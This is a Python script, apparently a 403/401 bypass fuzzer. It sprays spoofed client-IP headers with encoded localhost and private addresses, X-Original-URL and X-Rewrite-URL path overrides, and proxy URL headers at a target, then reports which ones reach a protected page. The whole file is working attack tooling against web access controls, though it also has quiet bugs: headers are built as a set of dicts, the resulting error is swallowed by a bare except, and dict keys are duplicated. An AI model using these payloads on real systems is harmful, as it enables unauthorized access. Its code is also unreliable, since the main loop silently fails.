import requests
from urllib.parse import urlparse
import time, eventlet


def get_path_from_url(url):
    parsed_url = urlparse(url)
    return parsed_url.path

urlPayloads = ['~', '.', ';', '*', '#', '?', '/', '//', '%09', '%20', '%5C', '%23', '%00']
IPs = ['192.168.1.0', '192.168.1.1', '10.0.0.0', '10.1.1.1', '172.16.0.0', '172.16.1.1', '192.168.0.0', '127.0.0.1', '127.0.1', '127.1', '127.000.000.001', '::1', '0000::1', '0177.0.0.01', '0x7f.0x0.0x0.0x1', '0x7f000001', '0x885aed3a587f000001', '281472812449793', '0x7f.0.0.0x1', '::ffff:7f00:0001', "localhost", "localhost:80", "localhost:443", "127.0.0.1:80", "127.0.0.1:443", "2130706433", "0x7F000001", "0177.0000.0000.0001", "0", "10.0.0.1", "172.16.0.1"]
Custom_Headers = {'X-Forwarded-Port': '443', 'X-Forwarded-Port': '4443', 'X-Forwarded-Port': '80', 'X-Forwarded-Port': '8080', 'X-Forwarded-Port': '8443', 'X-Forwarded-Proto': 'http', 'X-Forwarded-Proto': 'https', 'X-Forwarded-Scheme': 'http', 'X-Forwarded-Scheme': 'https', 'Request-ID': '1234567890', 'Max-Forwards': '0', 'Max-Forwards': '1', 'Max-Forwards': '2'}
IP_headers = ['X-Originating-IP', 'X-Forwarded-For', 'X-Forwarded','Forwarded-For','X-Remote-IP','X-Remote-Addr','X-ProxyUser-Ip','X-Original-URL','Client-IP','True-Client-IP','Cluster-Client-IP','X-ProxyUser-Ip','Host']
URL_Header = ['Proxy-Url', 'Referer', 'Referer', 'Referer', 'Url', 'Url', 'X-Proxy-Url']
user_agents = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19E241 Safari/602.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
    "Mozilla/5.0 (Linux; Android 13; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
]


url = input("URL: ")


response = requests.get(url)
if response.status_code in (401, 403):
    
    payloads = [
    {'X-Original-URL': get_path_from_url(url)},
    {'X-Rewrite-URL': get_path_from_url(url)}
    ]

    payloads.append(Custom_Headers)
    
    for IP_H in IP_headers:
        for value in IPs:
            payloads.append({IP_H: value})

    for URL_H in URL_Header:
        payloads.append({URL_H: url})
    
    i = 0
    for payload in payloads:
        with eventlet.Timeout(0.1): # stable connection
            try:
                header = {payload, {"User-Agent": user_agents[i]}}
                i += 1
                i %= len(user_agents)
                response = requests.get(url, headers=header)
                if response.status_code >= 200 and response.status_code < 300:  # OK
                    print(f"vulnerable to 403 bypass, just use payload: {payload}")
                elif (response.status_code >= 300 and response.status_code < 400): # redirects
                    print(f"may be vulnerable to 403 bypass, just use payload: {payload}")
            except:
                pass

    #todo, use urlPayloads: (see wrock ideas & get payloads form BypassFuzzer)
    # - at the begin of path before tld
    # - at the end of the url
    # - split endpoint 1
    # - split endpoint 2
    # - .. split each endpoint
